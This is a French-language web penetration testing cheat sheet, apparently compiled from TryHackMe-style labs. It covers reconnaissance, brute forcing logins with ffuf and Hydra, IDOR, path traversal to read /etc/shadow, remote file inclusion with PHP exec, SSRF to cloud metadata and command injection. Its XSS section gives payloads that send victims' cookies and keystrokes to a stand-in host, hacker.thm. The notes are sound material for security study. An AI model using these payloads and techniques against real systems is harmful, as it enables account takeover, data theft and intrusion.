```toc

```

# Outils

## Scan d'exposition
Utiliser Shodan et Cert.sh (scan passif) : 
- https://www.shodan.io/
- https://crt.sh/

Utiliser nmap (scan actif) :
```bash
sudo nmap -sS <ip_addr> -p 80,8080,443,8443,8200,8300
```

## Wapalizer
Extension Firefox qui permet d'identifier les technologies et framework utilisés (wordpress, react, ...) par un site internet.

## Nikto
Scanneur de vulnérabilités web.

## WPscan
Si le site est en WordPress (un bon indicateur est la présence de dossier en "wp-..." dans les sources, cf inspecteur > sources), utiliser *wpscan* permet d'identifier les vulnérabilité classique.
https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation

*Note* : wpscan nécessite une clé API pour faire les scans de vuln, etc (un compte gratuit suffit).

## Brute force path, users, pwd, ...
dirb, ffuf


# 1. Content discovery

## Manuellement
Déjà, se promener sur le site et identifier toutes les pages accessibles et celles avec une entrée utilisateur possible.

Checklist :
- Chercher ``robots.txt`
- Chercher `sitemap.xml`
- Identifier les technologies utilisées :
	- Regarder si le favicon a été changé
	- Utiliser Wapalizer
	- Regarder le code source (wp-content, wp-... => Wordpress)
	- Faire une requête `curl` et regarder les headers
- Faire de l'OSINT :
	- Google dorking (`site:sitetohack`, `inurl:admin`, `filetype:pdf`, `intitle:admin`)
	- Chercher une veille version du site : [https://archive.org/web/](https://archive.org/web/)
	- Chercher un répertoire Github
	- Chercher un bucket S3 : https://{name}.s3.amazonaws.com en essayer avec name étant : nomentreprise-assets, nomentreprise-public, nomentreprise-www, ...

## Automatiquement
Prendre une wordlist efficace, par exemple : [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) 

Puis utiliser dirb ou gobuster par exemple (dirb est recursif par défaut mais pas gobuster).
```bash
dirb <target_url> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

gobuster dir --url <target_url> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```



## Sous domaine
Objectif : trouver des sous-domaines pour élargir le périmètre.
### OSINT
Utiliser http://crt.sh/ pour chercher le domaine à attaquer et voir si des certificats SSL ont été enregistrés pour d'autres sous domaines.

Faire du google dorking : `-site:www.domain.com site:*.domain.com`

### Brute force
Brute force les sous-domaines possibles : 
```bash
dnsrecon -t brt -d <domain>

./sublist3r.py -d acmeitsupport.thm
```

### Virtual host
Des sous-domaines peuvent ne pas être exposé publiquement (version de dev, sous-domaine du backend, ...). Ces sous-domaines peuvent être définis dans /etc/hosts par exemple.
Si on envoie une requête au serveur avec un header Host étant un sous domaine valide (backend.domain.com en supposant qu'il existe), le serveur répondra une réponse différente d'un sous domaine invalide.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u <url>

# Then filter all failed attempts (responses with the same length which represent the majority)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u <url> -fs <resp_size_to_filter>
```

"FUZZ" indique quel partie `ffuf` changera.


# 2. Contourner l'authentification
Objectifs :
1. Lister les utilisateurs existants
2. Trouver leur mot de passe

## Lister des utilisateurs existants
Si une page renvoie une erreur différente lorsqu'un utilisateur existe, il faut l'exploiter !
Regarder en particulier la page pour créer un compte et celle pour reset le mot de passe.
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u <signup_url> -mr "username already exists"
```
Le tag `mr` est le texte qui sera cherché dans la réponse pour valider qu'un utilisateur a été trouvé.

## Trouver leur mot de passe
L'idée est simple : brute force le mot de passe.
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <login_url> -fc 200
```
Le tag `fc` filtre les code de retour 200 pour n'afficher que les lignes avec des codes de retour différent de 200 (302 car il y a une redirection par exemple).

## Avec Hydra
On pourrait aussi le faire avec Burp mais avec la version gratuite c'est trop lent (1 requête par seconde). Burp reste très utile pour identifier rapidement le format de la requête à envoyer.
Avec Hydra :
```bash
hydra -l <login> -p <password> <target_ip> <method> <optional_args>
hydra -L <logins_file> -P <passwords_file> <target_ip> <method> <optional_args>
```
### HTTP form post
```bash
# HTTP form post
hydra -L <logins_file> -P <passwords_file> <target_ip> http-form-post "<path>:<login_form_attribute_name>=^USER^&<password_form_attribute_name>=^PASS^:<string_to_detect_incorrect_credentials>"

# Example
hydra -L <logins_file> -P <passwords_file> <target_ip> http-form-post "/login/index.html:username=^USER^&password=^PASS^:Mot de passe incorrect"
```

## Bonus
- Trouver une faille dans la logique d'authentification ou de reset du mot de passe (voir la requête exacte qui est effectué et si on peut jouer avec).
- Jouer avec le cookie pour gagner des droits (ex : changer admin=false en admin=true).


# IDOR
Insecure Direct Object Reference : quand l'utilisateur peut faire référence à un objet et que le serveur le lui renvoie alors qu'il ne devrait pas (changer l'id dans l'url, ...).

Pour en trouver :
- Bien regarder les requêtes faîtes au back : l'id est-il dans l'url, dans le corps du post, le front fait-il un appel à une API back pour afficher des info (cf réseau dans les outils développeur), ...
- Trouver comment prédire l'ID :
	- ID prédictible directement (1234, 1235, ...)
	- ID encodé en base64
	- ID hashé en md5
- Si l'ID n'est pas prédictible : créer 2 comptes et essayer d'accéder au contenu du compte 1 depuis le compte 2. Si ça fonctionne, on a trouvé une vulnérabilité IDOR.

# File inclusion
Un site web peut avoir besoin d'afficher un fichier (pdf, text, photo, ...) qui est requêté par le front. En l'absence de validation de l'input du front, il est possible de demandé un autre fichier et de faire fuiter de l'information, accéder au mot de passe des comptes sur la machines (`/etc/shadow`), ...
## Path traversal
On remonte dans l'arborescence des fichiers avec autant de "`../`" que nécessaire pour accéder au dossier racine puis on essaie d'accéder à des fichiers tel que `/etc/passwd` ou `/etc/shadow` sur Linux et `c:\boot.ini` sur Windows.

Exemples :
```
GET http://webapp.thm/get.php?file=../../../../etc/passwd
GET http://webapp.thm/get.php?file=../../../../boot.ini
```


En PHP, en l'absence de validation de l'input, les fonctions suivantes sont vulnérables :
- get_file_contents
- include
- require

Petit tricks en cas de filtrage :
- Ajouter un octet nul à la fin : `%00`
- Ecrire le path différemment :
	- Ajouter `/.` à la fin
	- Remplacer `../` par `....//` (cela fonctionne si les `../` sont filtrés une seule fois)
	- Commencer par `foldername_to_include_from/../` si fichiers doivent être importés depuis un dossier en particulier

## Remote File Inclusion
Si la configuration du serveur le permet, il peut être possible d'inclure un fichier présent sur un autre serveur contrôlé par l'attaquant.
En PHP, il faut que l'option `allow_url_fopen` valent `on`.

Ex : `http://webapp.thm/index.php?file=http://attacker.thm/cmd.txt`

Le serveur va récupérer le fichier `cmd.txt` hébergé chez l'attaquant, il va l'exécuter et renvoyer le résultat dans sa page `index.php`.

On peut tester cette vulnérabilité avec le fichier `cmd.txt` suivant : 
```php
<?PHP echo "YEEEAAH !!!"; ?>
```
Cela peut permettre de l'exécution de code à distance (RCE) !!!
Par exemple :
```php
<?PHP
echo exec('hostname');
?>
```


# SSRF
Server Side Request Forgery : manipuler le serveur du front pour qu'il exécute la requête que l'on a envie.
Exemples :
```
Utilisateur : GET https://website.fr?url=/user
Serveur front : GET https://website.fr/api/user?param=true (et renvoie la réponse à l'utilisateur)
```
Un attaquant peut manipuler le paramètre `url`.

Astuces :
- `../` permet de remonter d'un niveau dans l'url, donc si on met `url=../admin`, le serveur fera une requête à `/api/../admin` qui est équivalent à `/admin`.
- `?x=` ou `&x=` permet d'ignorer ce qui suit, donc si on met `url=../admin?param=false&x=`, le serveur fera une requête équivalente à `/admin?param=false`.
- Parfois l'entrée utilisateur est utilisé comme sous domaine, ce qui permet de controller tout l'url avec l'astuce précédente. Ex normal : `?server=api` mènera à la requête à `https://api.website.fr`. Ex malicieux : `?server=secret.website.fr?x=`.
- Quand on a le contrôle total sur l'URL on peut en particulier demander à requêter un serveur que l'on contrôle.
- On peut accéder au page qui ont une restriction sur l'origine de la requête ! (Ex : page admin accessible que depuis le localhost).
- Il peut être intéressant d'accéder au serveur directement via `127.0.0.1` ou aux metadonnées de l'instance dans le cas du cloud via `169.254.169.254`.

Entrées principales pour une SSRF :
- Url entière en paramètre : `?server=http.server.website.fr/store`
- Url partielle : `?server=api`
- Path dans l'url : `/forms/contact`
- Champ caché dans un formulaire : 
```html
<input type=hidden name=server value="https://server.website.fr/store"
```



# XSS
Cross Site Scripting : exécuter du code javascript dans le navigateur de la victime

Exemple :
- *Stored XSS* : mettre un commentaire sur un forum `<scrip>alert('pawned')</script>`, si l'input est stocké tel quel dans la bdd et qu'il est inséré sans traitement (encodage) dans la page envoyé à l'utilisateur visitant le forum, le code sera exécuté. Un autre exemple est de faire la même chose dans les champs de son profil utilisateur.
- *Reflected XSS* : faire du phishing en envoyant le lien `https://website.com/name=<scrip>alert('pawned')</script>`, si la page affiche la valeur de `name` sans traitement, le script sera exécuté.

Exemple de payload :
- `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` : permet de récupérer le cookie de la victime (l'encode en basse64 pour être sur de la bonne transmission)
- `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` : key logger
- `<script>user.changeEmail('attacker@hacker.thm');</script>` : si une fonction spécifique au site vulnérable est `user.changeEmail`, on peut l'exécuter aussi.

Il peut-être utile de modifier la payload pour échapper la balise dans laquelle elle apparaît, par exemple `<\textarea><script>...<\script>`.
Il existe des alternatives à la balise script lorsque celle ci est filtré. Par exemple :
- `<sscriptcript>alert('THM');</sscriptcript>`
- `<img src="fake" onerror="alert('THM');" />`

Un outil pour aider la recherche de XSS est : https://github.com/mandatoryprogrammer/xsshunter-express

Pour faire des tests, il est possible d'utilise https://beeceptor.com pour recevoir les requêtes faite par la payload et les cookies de session par exemple.


# Command injection / RCE
L'injection de commande ou Remote Command Execution consiste à faire exécuter une entrée utilisateur par l'OS sur lequel tourne le serveur.
Ex : le serveur, codé en PHP ou Python par exemple, fait un appel système pour exécuter la commande `grep $user_input file` pour faire une recherche sur un fichier présent sur le serveur. Si cette entrée n'est pas filtré, l'utilisateur pourra la modifier pour exécuter une autre commande.

On peut distinguer 2 cas :
- Le serveur renvoie directement le résultat de la commande : c'est le cas le plus simple.
- Le serveur ne renvoie pas le résultat de la commande : pour identifier la faille, on peut utiliser les commandes `ping` ou `sleep` pour créer un délai dans la réponse, ou rediriger le résultat de la commande dans un fichier (`> file.txt`) puis afficher le contenu du fichier (accès direct au fichier, utilisation de `cat`, ...). 

Les opérateur `&`, `&&` et `;` sont particulièrement utiles pour les injections de commandes.

Commandes utiles :
- Linux :
	- `whoami`
	- `ls`
	- `ping`
	- `sleep`
	- `nc`
- Windows :
	- `whoami`
	- `dir`
	- `ping`
	- `timeout`

Note : `ping` n'est pas installé par défaut mais `sleep` ou  `timeout` le sont.

Command injection cheat-sheet : https://github.com/payloadbox/command-injection-payload-list


# SQL injection
cf [[SQLi]]